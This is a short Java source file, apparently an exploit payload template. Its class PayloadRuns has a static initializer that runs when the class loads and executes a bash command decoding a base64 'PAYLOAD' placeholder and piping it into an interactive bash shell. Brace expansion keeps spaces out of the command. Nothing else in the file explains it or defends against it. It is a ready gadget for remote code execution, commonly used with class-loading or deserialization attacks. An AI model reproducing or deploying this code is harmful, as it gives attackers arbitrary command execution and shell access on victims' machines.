import java.util.Base64;

public class PayloadRuns {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,PAYLOAD}|{base64,-d}|{bash,-i}");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}